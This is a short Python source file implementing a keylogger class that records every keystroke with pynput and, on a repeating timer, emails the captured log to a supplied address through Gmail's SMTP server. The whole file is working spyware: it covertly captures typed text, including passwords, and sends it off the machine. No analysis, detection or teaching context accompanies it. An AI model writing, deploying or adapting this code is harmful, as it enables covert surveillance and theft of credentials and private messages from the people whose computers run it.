from pynput import keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time, email, password):
        self.log = "[+] Keylogger has started"
        self.time_interval = time
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def key_pressed(self, key):
        try:
            key_special = str(key.char)
        except AttributeError:
            if key == key.space:
                key_special = " "
            else:
                key_special = " " + str(key) + " "
        self.append_log(key_special)

    def mail_sender(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def mail(self):
        self.mail_sender(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.time_interval, self.mail)
        timer.start()

    def launch(self):
        listener = keyboard.Listener(on_press = self.key_pressed)
        with listener:
            self.mail()
            listener.join()